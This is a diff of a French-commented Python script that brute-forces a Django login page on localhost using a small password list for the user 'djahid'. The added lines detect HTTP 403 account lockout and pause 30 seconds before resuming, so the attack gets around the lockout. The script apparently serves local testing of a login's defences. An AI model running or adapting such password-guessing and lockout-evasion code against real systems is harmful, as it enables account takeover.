@@ -5,7 +5,7 @@ from bs4 import BeautifulSoup
 # URL de ta page de connexion Django
 url = 'http://127.0.0.1:8000/'  
 
-username = 'username' 
+username = 'djahid' 
 resultats = ['salem1111', 'sds*333/', 'dsds@4545', 'sd1*3dsd', "djahid", 'mahmoude-888','azerty']
 
 # Créer une session
@@ -32,7 +32,11 @@ def try_password(password):
     # Envoyer la requête POST au serveur
     response = session.post(url, data=data, headers=headers)
     #response = requests.post(url, data=data, headers=headers)
-   
+    if response.status_code == 403:
+            print("le compte A ete blocker wait 30 seconde pour la prochaine attaque")
+            time.sleep(30)  # Attente de 30 secondes 
+            return False  # Retourne False pour indiquer l'échec de la tentative
+    
     if "Login successful!" in response.text:
         print(f"Connexion réussie avec : {username} / {password}")
         return True
